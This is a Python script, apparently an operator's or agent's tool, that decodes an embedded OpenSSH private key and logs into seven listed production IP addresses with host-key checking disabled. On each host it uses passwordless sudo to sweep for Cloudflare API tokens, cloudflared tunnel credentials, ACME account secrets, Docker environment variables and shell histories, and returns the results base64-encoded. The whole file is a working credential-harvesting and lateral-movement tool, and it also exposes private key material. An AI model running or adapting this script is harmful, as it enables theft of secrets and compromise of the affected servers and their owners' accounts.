# -*- coding: utf-8 -*-
# intent 29610 round A: hunt Cloudflare API tokens / cloudflared tunnel configs across the Lumii
# production fleet reachable with the hk fleet key. results -> R:<key>:<b64 json>
import json, os, sys, base64, re, subprocess
from concurrent.futures import ThreadPoolExecutor

WORK = "/tmp/p29610"; os.makedirs(WORK, exist_ok=True)
KEYB64 = "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey", 0o600)

def R(k, v, maxb=40000):
    s = json.dumps(v, ensure_ascii=False) if not isinstance(v, str) else v
    if len(s) > maxb: s = s[:maxb] + "...TRUNC(len=%d)" % len(s)
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(s.encode()).decode())); sys.stdout.flush()

def run(cmd, inp=None, timeout=300):
    try:
        p = subprocess.run(cmd, input=inp, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", repr(e)

SSHOPTS = ["-i", WORK+"/fleetkey", "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
           "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=12",
           "-o", "IdentitiesOnly=yes", "-o", "ServerAliveInterval=10"]

REMOTE = r'''
set +e
echo "@@@ID"; id; hostname; hostname -I 2>/dev/null | tr ' ' '\n' | head -5; head -2 /etc/os-release 2>/dev/null
echo "@@@SUDO"; sudo -n id 2>&1
echo "@@@CFFILES"
timeout 70 sudo grep -aEIl 'CLOUDFLARE|CF_API_TOKEN|CF_DNS_API_TOKEN|CF_GLOBAL_API_KEY|CF_ZONE_ID|CF_Key|CF_Token|cloudflared|dns_cloudflare|cfdns|api\.cloudflare\.com' /etc /opt /root /home /data /srv /var/www /usr/local /var/lib 2>/dev/null | grep -vE 'node_modules|/usr/(lib|share|src)|\.git/objects|/proc/' | head -70
echo "@@@CFHIT"
for f in $(timeout 70 sudo grep -aEIl 'CLOUDFLARE|CF_API_TOKEN|CF_DNS_API_TOKEN|CF_GLOBAL_API_KEY|CF_ZONE_ID|CF_Key|CF_Token|cloudflared|dns_cloudflare|cfdns|api\.cloudflare\.com' /etc /opt /root /home /data /srv /var/www /usr/local /var/lib 2>/dev/null | grep -vE 'node_modules|/usr/(lib|share|src)|\.git/objects|/proc/' | head -50); do echo "== $f"; timeout 30 sudo grep -aoiE '.{0,90}(CLOUDFLARE[A-Z_]*|CF_API_TOKEN|CF_DNS_API_TOKEN|CF_GLOBAL_API_KEY|CF_ZONE_ID|CF_Key|CF_Token|cloudflared|dns_cloudflare|cfdns|api\.cloudflare\.com).{0,130}' "$f" 2>/dev/null | head -8; done
echo "@@@CFHOME"
for f in /root/.cloudflared/config.yml /root/.cloudflared/config.yaml /root/.cloudflared/*.json /root/.cloudflared/cert.pem /etc/cloudflared/config.yml /etc/cloudflared/config.yaml /etc/cloudflared/*.json /etc/cloudflared/cert.pem /home/*/.cloudflared/config.yml /home/*/.cloudflared/*.json; do [ -f "$f" ] && { echo "== $f"; timeout 20 sudo sed -n '1,60p' "$f" 2>/dev/null; }; done
echo "@@@CFBIN"
ls -la /root/.cloudflared /etc/cloudflared /home/*/.cloudflared 2>/dev/null; which cloudflared 2>/dev/null
echo "@@@ACME"
for f in /root/.acme.sh/account.conf /home/*/.acme.sh/account.conf /root/.config/lego/lego.env /root/.lego/accounts/*/*/*/*.json; do [ -f "$f" ] && { echo "== $f"; timeout 15 sudo grep -aiE 'CF_|CLOUDFLARE|SAVED_|TOKEN|API_KEY|EMAIL' "$f" 2>/dev/null | head -12; }; done
ls -la /etc/letsencrypt/renewal 2>/dev/null | head -10
echo "@@@CADDYENV"
for f in /etc/caddy/*.env /etc/caddy/*.conf /etc/systemd/system/*.service; do [ -f "$f" ] && timeout 10 sudo grep -aiE 'cloudflare|CF_|api.cloudflare' "$f" 2>/dev/null | head -4 && echo "--$f"; done
echo "@@@DOCKERENV"
sudo docker ps --format '{{.Names}}|{{.Image}}|{{.Ports}}' 2>/dev/null | head -30
for cid in $(sudo docker ps -q 2>/dev/null | head -25); do echo "== cid $cid $(sudo docker inspect -f '{{.Name}}' $cid 2>/dev/null)"; timeout 20 sudo docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' $cid 2>/dev/null | grep -aiE 'CLOUDFLARE|CF_API|CF_DNS|CF_ZONE|CF_TOKEN|TUNNEL' | head -8; done
echo "@@@HIST"
for f in /root/.bash_history /home/*/.bash_history; do [ -f "$f" ] && { echo "== $f"; timeout 15 sudo grep -aiE 'cloudflare|CF_API|CF_TOKEN|cloudflared|flared' "$f" 2>/dev/null | head -15; }; done
echo "@@@END"
'''

TARGETS = [("43.143.107.214","share-center"),("101.32.60.77","hk"),("122.51.1.87","prod"),
           ("1.14.34.31","wjl"),("81.68.254.22","aro81"),("43.142.238.91","golden-stage"),
           ("129.211.0.26","prod-agent")]

def do(host,label):
    a = ["ssh"]+SSHOPTS+["-o","ConnectTimeout=12","ubuntu@%s"%host,"sudo -n bash -s"]
    rc,o,e = run(a, inp=REMOTE.encode(), timeout=420)
    ok = "@@@END" in o
    R("t_%s_meta"%label, {"host":host,"rc":rc,"ok":ok,"err":e[-300:],"outlen":len(o)})
    parts = re.split(r'@@@([A-Z0-9_]+)', o)
    for i in range(1,len(parts),2):
        sec=parts[i]; body=parts[i+1] if i+1<len(parts) else ""
        if body.strip():
            R("%s_%s"%(label,sec.lower()), body[:26000])
    return label, ok

with ThreadPoolExecutor(max_workers=4) as ex:
    futs=[ex.submit(do,h,l) for h,l in TARGETS]
    for f in futs:
        try: print("done", f.result(), flush=True)
        except Exception as e: print("ERR", e, flush=True)
print("ALLDONE", flush=True)
